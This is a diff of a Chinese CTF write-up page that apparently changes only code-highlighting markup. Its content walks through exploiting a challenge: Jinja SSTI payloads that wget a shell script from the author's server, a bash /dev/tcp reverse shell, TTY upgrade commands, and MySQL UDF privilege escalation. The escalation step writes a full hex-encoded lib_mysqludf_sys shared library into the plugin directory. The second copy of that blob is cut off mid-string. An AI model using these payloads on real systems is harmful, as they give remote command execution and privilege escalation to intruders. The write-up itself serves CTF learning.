-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_specific_file</span>(<span class="params">tar_path, file_name, extract_path</span>):</span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(tar_path, <span class="string">&quot;r:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        file_info = tar.getmember(file_name)</span><br><span class="line">        tar.extract(file_info, path=extract_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">7777</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        js = json.loads(data)</span><br><span class="line">        <span class="keyword">if</span> js[<span class="string">&#x27;code&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">            extract_specific_file(js[<span class="string">&#x27;path&#x27;</span>], <span class="string">&#x27;new.bin&#x27;</span>, <span class="string">&quot;/updatedir&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        s.send(<span class="string">b&#x27;Error&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> tarfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_specific_file</span>(<span class="hljs-params">tar_path, file_name, extract_path</span>):<br>    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(tar_path, <span class="hljs-string">&quot;r:gz&quot;</span>) <span class="hljs-keyword">as</span> tar:<br>        file_info = tar.getmember(file_name)<br>        tar.extract(file_info, path=extract_path)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br><br>s = socket.socket()<br>s.connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">7777</span>))<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data = s.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">try</span>:<br>        js = json.loads(data)<br>        <span class="hljs-keyword">if</span> js[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">1</span>:<br>            extract_specific_file(js[<span class="hljs-string">&#x27;path&#x27;</span>], <span class="hljs-string">&#x27;new.bin&#x27;</span>, <span class="hljs-string">&quot;/updatedir&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        s.send(<span class="hljs-string">b&#x27;Error&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
 <p>这个文件给了一个解压文件的函数</p>
-<p><a target="_blank" rel="noopener" href="http://www.py没啥看的,就是模版渲染的地方./">www.py没啥看的，就是模版渲染的地方。</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.py/">www.py</a> 没啥看的，就是模版渲染的地方。</p>
 <p>这道题是非预期，在brother_revenge这道题被修复了，hh所以没用上key和evil路由，打mysql udf提权</p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>第一步得反弹shell，这样方便我们操作，这道题环境没有curl、nc等常用命令。（最开始curl没测出来还以为不出网&#x3D;-&#x3D;）但是这里有wget命令，我们在自己的vps上放入一个shell.sh文件。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
 
 <p>把这个文件用wget下载到tmp目录里：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cd /tmp;wget http://ip/shell.sh&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cd /tmp;wget http://ip/shell.sh&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706132722224.png" alt="image-20240706132722224"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706132722224.png" srcset="/img/loading.gif" lazyload alt="image-20240706132722224"></p>
 <p>刚下载进去这个sh文件是没有执行权限的，我们需要给他加上执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cd /tmp;chmod %2bx *&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cd /tmp;chmod %2bx *&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>这里的命令chmod +x *为什么要把加号变成%2b呢？是因为这里加号会被url自动解码成空格，我们想用加号就必须用加号的url编码之后的形式。</p>
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706133013583.png" alt="image-20240706133013583"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706133013583.png" srcset="/img/loading.gif" lazyload alt="image-20240706133013583"></p>
 <p>现在shell.sh就有了执行权限，我们先服务器起监听，然后运行这个文件bash &#x2F;tmp&#x2F;shell.sh</p>
 <p>成功反弹shell</p>
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706133147209.png" alt="image-20240706133147209"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706133147209.png" srcset="/img/loading.gif" lazyload alt="image-20240706133147209"></p>
 <h3 id="mysql-udf提权"><a href="#mysql-udf提权" class="headerlink" title="mysql udf提权"></a>mysql udf提权</h3><p>这里奉上国光师傅的文章</p>
 <p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
 <p>总的来说我们需要写入动态链接库，这里没有注入点，就没法用sqlmap直接写入，需要用原生mysql语句打。当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的</p>
 <p>我们先进入可交互式的mysql里</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br><span class="line">然后ctrl+z</span><br><span class="line">stty raw -echo; fg</span><br><span class="line">mysql -uctf -p123456</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br>然后ctrl+z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>mysql -uctf -p123456<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706134812450.png" alt="image-20240706134812450"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706134812450.png" srcset="/img/loading.gif" lazyload alt="image-20240706134812450"></p>
 <p>利用这个工具<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
 <p>我们需要的是lib_mysqludf_sys_64.so</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff